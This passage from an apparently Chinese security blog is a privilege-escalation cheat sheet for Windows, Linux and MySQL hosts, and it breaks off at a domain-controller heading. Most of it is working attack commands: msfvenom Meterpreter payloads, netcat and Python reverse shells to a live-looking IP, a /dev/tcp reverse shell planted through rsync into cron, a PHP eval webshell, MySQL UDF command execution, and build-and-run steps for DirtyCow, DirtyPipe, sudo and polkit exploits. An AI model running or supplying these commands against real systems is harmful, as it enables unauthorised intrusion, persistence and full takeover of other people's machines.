</ul>
<p>at 命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用 system 权限。适用版本：Win2000 &amp; Win2003 &amp; XP 中还是存在的，在 Win7 以 后被剔除。当我们拿到低权限的用户，通过连接上服务器后，可以通过 at 命令 来进行本地提权。</p>
<p>at 21:00 /interactive cmd (在 20:33 分生成一个交互式的 System 权限的 cmd)</p>
<ul>
<li>sc 命令提权</li>
</ul>
<p>sc 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类 似于控制面板中管理工具项中的服务。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个名叫 syscmd 的新的交互式的 cmd 执行服务</span></span><br><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type=interact</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行服务</span> </span><br><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure>
<h4 id="psexec-提权"><a class="markdownIt-Anchor" href="#psexec-提权">#</a> psexec 提权</h4>
<p>适用版本：Win2012 and Win2008 &amp; Win2016 基本可以</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wc3Rvb2xz">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</span></p>
<p><code>psexec.exe -accepteula -s -i -d cmd</code></p>
<h4 id="进程迁移注入"><a class="markdownIt-Anchor" href="#进程迁移注入">#</a> 进程迁移注入</h4>
<ul>
<li>win 2008 进程注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">相当于开了一个后门，注入到其他用户进程下</span></span><br><span class="line">pinjector -l</span><br><span class="line">pinjector -p 420 cmd 3333</span><br><span class="line">nc 192.168.46.149 3333</span><br></pre></td></tr></table></figure>
<ul>
<li>Win2008 2012 2016 MSF 进程注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看进程</span></span><br><span class="line">ps </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">迁移对应PID</span></span><br><span class="line">migrate PID</span><br></pre></td></tr></table></figure>
<h4 id="窃取令牌"><a class="markdownIt-Anchor" href="#窃取令牌">#</a> 窃取令牌</h4>
<p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。当一个攻击者 需要域管理员的操作权限时候，需通过假冒域管理员的令牌进行攻击。适用 win2012。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">令牌窃取</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117</span><br><span class="line">LPORT=3333 -f exe -o msf.exe</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
<h4 id="烂土豆提权"><a class="markdownIt-Anchor" href="#烂土豆提权">#</a> 烂土豆提权</h4>
<p>适用 Win2008 2012 2016。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute -cH -f ./potato.exe //配合烂土豆</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
<h4 id="win-msf-自动化提权"><a class="markdownIt-Anchor" href="#win-msf-自动化提权">#</a> Win msf 自动化提权</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前权限</span></span><br><span class="line">getuid</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">提权</span></span><br><span class="line">getsystem</span><br></pre></td></tr></table></figure>
<h4 id="bypassuac-提权"><a class="markdownIt-Anchor" href="#bypassuac-提权">#</a> bypassUAC 提权</h4>
<p>为了远程执行目标的 exe 或者 bat 可执行文件绕过此安全机制，以此叫 BypassUAC，开启 UAC 和未开启 UAC 时，MSF 默认 getsystem 提权影响 (进程注 入)。适用 win10。</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.46.158 lport=3333 -f exe -o msf.exe</code></p>
<ul>
<li>MSF 模块 BypassUAC</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Win7本地权限</span></span><br><span class="line">use exploit/windows/local/bypassua</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Win10本地权限</span></span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line">use exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">use exploit/windows/local/bypassuac_silentcleanup</span><br></pre></td></tr></table></figure>
<ul>
<li>UACME 项目（推荐）</li>
</ul>
<p>通过此程序调用 exe 文件，调用时用的 SYSTEM 权限，则此时反弹得到的 shell 是可以提权到 STSTEM 权限的。</p>
<p>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hmaXJlZjB4L1VBQ01F">https://github.com/hfiref0x/UACME</span></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Akagi64.exe 编号 调用执行</span></span><br><span class="line">Akagi64.exe 41 msf1.exe</span><br></pre></td></tr></table></figure>
<h4 id="dll劫持提权"><a class="markdownIt-Anchor" href="#dll劫持提权">#</a> Dll 劫持提权</h4>
<p>Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过 在应用程序要查找的位置放置恶意 DLL 来提权。通常，Windows 应用程序有其 预定义好的搜索 DLL 的路径，它会根据下面的顺序进行搜索：应用程序加载的 目录、C:\Windows\System32、C:\Windows\System、C:\Windows、当前工作目录 Current Working Directory，CWD、在 PATH 环境变量的目录 (先系统后用户)。适用 win2012。</p>
<p>利用火绒剑进行进程分析加载 DLL，一般寻程序 DLL 利用，制作 dll 并上 传，替换 dll，启动应用后成功。还可以用 ChkDllHijack 来检测与某程序相关联 的 DLL 文件，提前信息收集相关软件及 DLL 问题程序，本地调试成功后覆盖 DLL 实现利用。</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=4444 -f dll -o xiaodi.dll</code></p>
<h4 id="服务路径及权限"><a class="markdownIt-Anchor" href="#服务路径及权限">#</a> 服务路径及权限</h4>
<ul>
<li>不带引号服务路径配合 MSF</li>
</ul>
<p>利用 JAWS 或者命令检测服务路径，需要服务没有双引号并且服务中出现 了空格，那么就可以看作是前边的路径是程序后边的路径是参数，上传 exe 木 马到此路径下，并用命令行启动服务上传反弹 exe，设置好对应执行名后，执行 sc start “Macro Expert”，木马上线。适用 win2012。</p>
<p>JAWS 下载地址:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzQxMUhhbGwvSkFXUw==">https://github.com/411Hall/JAWS</span></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检测命令</span></span><br><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v</span><br></pre></td></tr></table></figure>
<ul>
<li>不安全的服务权限配合 MSF-NewServices</li>
</ul>
<p>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。 有的目录是不允许被修改的。</p>
<p>利用 accesschk 或 PowerUp (PowerSploit) 检测服务权限配置，制作文件并上 传，创建新服务并更改服务路径指向，启动服务时木马被执行。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PowerSploit 下载地址:</span></span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">accesschk 下载地址:</span></span><br><span class="line">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</span><br><span class="line"></span><br><span class="line">accesschk.exe -uwcqv &quot;administrators&quot; * Import-Module .\PowerUp.ps1 &amp;&amp; Invoke-All Checks sc config &quot;test&quot; binpath=&quot;C:\Program.exe&quot;</span><br><span class="line">sc start test</span><br></pre></td></tr></table></figure>
<h3 id="linux提权"><a class="markdownIt-Anchor" href="#linux提权">#</a> linux 提权</h3>
<h4 id="辅助项目提权"><a class="markdownIt-Anchor" href="#辅助项目提权">#</a> 辅助项目提权</h4>
<ul>
<li>项目地址</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpYW1nL3RyYWl0b3I=">https://github.com/liamg/traitor</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0JlUm9vdA==">https://github.com/AlessandroZ/BeRoot</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JlYm9vdHVzZXIvTGluRW51bQ==">https://github.com/rebootuser/LinEnum</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xpbnV4LWV4cGxvaXQtc3VnZ2VzdGVy">https://github.com/mzet-/linux-exploit-suggester</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NsZXZlbnR5ZWxldmVuL2xpbnV4cHJpdmNoZWNrZXI=">https://github.com/sleventyeleven/linuxprivchecker</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pvbmRvbmFzL2xpbnV4LWV4cGxvaXQtc3VnZ2VzdGVyLQ==">https://github.com/jondonas/linux-exploit-suggester-</span> 2<br>
Linux：<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v">https://gtfobins.github.io/</span><br>
Windows：<span class="exturl" data-url="aHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8v">https://lolbas-project.github.io/</span></p>
<ul>
<li>项目大致分类</li>
</ul>
<p>一个综合类探针 traitor，一个自动化提权 BeRoot (gtfobins&amp;lolbas)，两个信息收集 LinEnum linuxprivchecker，两个漏洞探针 linux-exploit-suggester&amp;2</p>
<h4 id="suid提权"><a class="markdownIt-Anchor" href="#suid提权">#</a> suid 提权</h4>
<p>chmod u+s 给予普通用户可以借助 root 权限执行某些命令，chmod u-s 可以删除 suid。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">手工命令探针安全</span></span><br><span class="line">find / -user root -perm - 4000 - print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm - 4000 - exec ls -ldb &#123;&#125; \;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">脚本项目探针安全</span></span><br><span class="line">LinEnum.sh traitor linuxprivchecker</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用NC反弹</span></span><br><span class="line">find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;</span><br><span class="line">netcat xx.xx.xx.xx 5555</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从 4444 端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</span></span><br><span class="line">nc x.x.x.x 4444 | /bin/bash | nc x.x.x.x 5555</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用Python反弹</span></span><br><span class="line">find xiaodi -exec python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.co nnect((&quot;47.94.236.117&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; \;</span><br><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
<h4 id="脏牛提权"><a class="markdownIt-Anchor" href="#脏牛提权">#</a> 脏牛提权</h4>
<p>搜寻 exp 直接提权。连接服务器，获取可利用漏洞，下载或上传 EXP，编译 EXP，给权限执行。</p>
<p>探针项目：BeRoot linux-exploit-suggester linux-exploit-suggester2</p>
<p>如 gcc 45010.c -o exp &amp;&amp; sh exp</p>
<p>linux 脏牛 dcow</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内核提权整个过程：（linux-exploit-suggester获取信息）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过msf拿到web权限，上传脏牛漏洞利用脚本exp</span></span><br><span class="line">upload /root/dcow.cpp /tmp/dcow.cpp</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">./dcow &amp;&amp; su root</span><br></pre></td></tr></table></figure>
<h4 id="脏管道提权"><a class="markdownIt-Anchor" href="#脏管道提权">#</a> 脏管道提权</h4>
<p>Linux-DirtyPipe 提权 (CVE-2022-0847)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://haxx.in/files/dirtypipez.c</span><br><span class="line">gcc -o dirtypipez dirtypipez.c</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">任何具体suid权限的文件均可</span></span><br><span class="line">./dirtypipez /usr/bin/su</span><br></pre></td></tr></table></figure>
<h4 id="环境变量配合suid"><a class="markdownIt-Anchor" href="#环境变量配合suid">#</a> 环境变量配合 suid</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">探针</span></span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">gcc demo.c -o shell &amp;&amp; chmod u+s shell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root用户可执行文件进行编译，保证文件的正常授权运行，给予 ROOT权限执行，普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限</span></span><br><span class="line">cp /bin/bash /tmp/ps &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; ./shell</span><br></pre></td></tr></table></figure>
<h4 id="定时任务配合tar"><a class="markdownIt-Anchor" href="#定时任务配合tar">#</a> 定时任务配合 tar</h4>
<p>利用计划任务的备份功能 tar 命令的参数利用，在计划任务中定时执行 <span class="exturl" data-url="aHR0cDovL3Rlc3Quc2g=">test.sh</span> 命令，执行之后会生成 bash 的 s 文件，可利用此进行提权；也可以利用直接将 反弹 shell 的代码写入 <span class="exturl" data-url="aHR0cDovL3Rlc3Quc2g=">test.sh</span>，只需监听端口，定时任务触发后就会接收到反弹 shell。</p>
<p><code>echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;;echo &quot;&quot; &gt; --checkpoint=1;echo'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; test.sh;chmod +x test.sh</code></p>
<h4 id="权限配置不当"><a class="markdownIt-Anchor" href="#权限配置不当">#</a> 权限配置不当</h4>
<p>利用不安全的权限分配操作导致的定时文件覆盖，导致某些文件可以被普</p>
<p>通用户修改，且此文件会定时执行。</p>
<p>所有者 / 组 / 其他：读取 4 写入 2 执行 1</p>
<p>755 表示所有者读取写入执行，组和其他用户只有读取和执行</p>
<p>644 表示所有者写入和执行，组和其他用户只有执行</p>
<p>444 r–r--r-- 600 rw------- 644 rw-r–r-- 666 rw-rw-rw-<br>
700 rwx------ 744 rwxr–r-- 755 rwxr-xr-x 777 rwxrwxrwx</p>
<h4 id="linux-mysql提权"><a class="markdownIt-Anchor" href="#linux-mysql提权">#</a> linux mysql 提权</h4>
<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmF2ZW4tMiwyNjkv">https://www.vulnhub.com/entry/raven-2,269/</span></p>
<ul>
<li>webshell 获取</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">探针IP及端口</span></span><br><span class="line">nmap 192.168.46.0/24</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用phpmailer漏洞进行修改并反弹</span></span><br><span class="line">python D:/Myproject/40974.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入后门利用菜刀连接方便操作</span></span><br><span class="line">echo &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; &gt;1.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传信息收集脚本进行提权信息收集</span></span><br><span class="line">./LinEnum.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">翻阅数据库配置文件获取root密码</span></span><br></pre></td></tr></table></figure>
<ul>
<li>mysql</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用Mysql提权 searchsploit，下载mysql udf kali poc进行编译：</span></span><br><span class="line">wget https://www.exploit-db.com/download/1518 - O raptor_udf.c</span><br><span class="line">gcc -g -c raptor_udf.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so 1518.so -lc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传或下载 1518 到目标服务器：</span></span><br><span class="line">wget https://xx.xx.xx.xx/1518.so</span><br></pre></td></tr></table></figure>
<ul>
<li>mysql udf 提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入数据库进行UDF导出：</span></span><br><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/1518.so&#x27;));</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建do_system函数调用：</span></span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配合使用find调用执行：</span></span><br><span class="line">touch xiaodi</span><br><span class="line">find xiaodi –exec &quot;whoami&quot; \;</span><br><span class="line">find xiaodi –exec &quot;/bin/sh&quot; \;</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
<ul>
<li>mysql 允许外联</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY&#x27;R@v3nSecurity&#x27; WITH GRANT OPTION;</span><br><span class="line">flush privileges;</span><br><span class="line">允许 root 外连若还是无法连接，则可能是防火墙的阻止，可利用 webshell工具将端口穿透出来。</span><br></pre></td></tr></table></figure>
<h4 id="mdut-数据库提权"><a class="markdownIt-Anchor" href="#mdut-数据库提权">#</a> mdut 数据库提权</h4>
<p>MDUT 2.0 数据库利用工具：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NhZmVHcm9jZXJ5U3RvcmUvTURVVA==">https://github.com/SafeGroceryStore/MDUT</span></p>
<p>java8 -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar</p>
<p>综合漏洞利用 (包含各数据库) <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xpcXVua2l0L0xpcXVuS2l0Xw==">https://github.com/Liqunkit/LiqunKit_</span> LiqunKit</p>
<p>mssql 利用工具：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL1NoYXJwU1FMVG9vbHM=">https://github.com/uknowsec/SharpSQLTools</span> SharpSQLTools</p>
<p>通过套接字重用通过受损的 Microsoft SQL Server 在受限环境中执行横向移动 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JsYWNrYXJyb3dzZWMvbXNzcWxwcm94eQ==">https://github.com/blackarrowsec/mssqlproxy</span> mssqlproxy</p>
<p>ODAT：Oracle 数据库攻击工具 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1ZW50aW5oYXJkeS9vZGF0">https://github.com/quentinhardy/odat</span> ODAT</p>
<h4 id="rsync-未授权"><a class="markdownIt-Anchor" href="#rsync-未授权">#</a> rsync 未授权</h4>
<p>Rsync 是 linux 下一款数据备份工具，默认开启 873 端口，借助 Linux 默认计划任务调用 /etc/cron.hourly，利用 rsync 连接覆盖。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个nc文件，内容如下：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/47.94.236.117/3333 0&gt;&amp;i</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">赋予执行权限</span></span><br><span class="line">chmod +x nc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传文件覆盖定时任务目录下：</span></span><br><span class="line">rsync -av nc rsync://47.94.236.117:873/src/etc/cron.hourly</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载文件</span></span><br><span class="line">rsync -av rsync://47.94.236.117:873/src/etc/passwd ./</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进行nc 监听相应的端口</span></span><br><span class="line">nc -lvnp 3333</span><br></pre></td></tr></table></figure>
<h4 id="docker-组挂载"><a class="markdownIt-Anchor" href="#docker-组挂载">#</a> docker 组挂载</h4>
<p>普通用户在 docker 组，利用 docker 服务启动镜像挂载目录，从而来访问 root 目录、etc 目录等敏感文件来进行权限提升。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建用户归类目录，添加到docker组</span></span><br><span class="line">useradd -d /home/test -m test</span><br><span class="line">passwd test</span><br><span class="line">usermod -G docker test</span><br><span class="line">newgrp docker</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从Docker上面下载alpine镜像，然后运行，-v将容器外部的目录/root挂载到容器内部/mnt，使用-it参数进入容器shell。</span></span><br><span class="line">docker run -v /root:/mnt -it alpine</span><br></pre></td></tr></table></figure>
<h4 id="sudo-提权"><a class="markdownIt-Anchor" href="#sudo-提权">#</a> sudo 提权</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudo: 版本在1.8.2-1.8.31p2 或者 1.0-1.5p1</span></span><br><span class="line">git clone https://github.com/blasty/CVE-2021-3156.git</span><br><span class="line">cd CVE-2021-3156</span><br><span class="line">make &amp;&amp; chmod a+x sudo-hax-me-a-sandwich</span><br><span class="line">./sudo-hax-me-a-sandwich 1</span><br></pre></td></tr></table></figure>
<h4 id="polkit-漏洞"><a class="markdownIt-Anchor" href="#polkit-漏洞">#</a> polkit 漏洞</h4>
<p>漏洞影响 2009 年 5 月至今的所有 polkit 版本，由于 polkit 是系统预装工具，所有存在 polkit 的 linux 系统均受影响，只要存在 polkit 且没有打补丁就可以提权。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">判断是否存在</span></span><br><span class="line">dpkg -l policykit-1 </span><br><span class="line">rpm -q policykit-1 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">漏洞利用</span></span><br><span class="line">git clone https://github.com/berdav/CVE-2021-4034.git</span><br><span class="line">cd CVE-2021-4034/</span><br><span class="line">make &amp;&amp; ./cve-2021-4034</span><br></pre></td></tr></table></figure>
<h3 id="域控提权"><a class="markdownIt-Anchor" href="#域控提权">#</a> 域控提权</h3>
<h4 id="cve-2014-6324"><a class="markdownIt-Anchor" href="#cve-2014-6324">#</a> CVE-2014-6324</h4>
<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmVpemlhbnF1YW4vcC8xMTc2MDU2NC5odG1s">https://www.cnblogs.com/feizianquan/p/11760564.html</span></p>
<ul>
<li>前提条件</li>
</ul>
<p>需要域用户账号密码 + 一台主机的管理员权限 + 域控没有打 MS14-068 的补丁 (KB3011780)</p>
<ul>
<li>工具下载</li>
</ul>
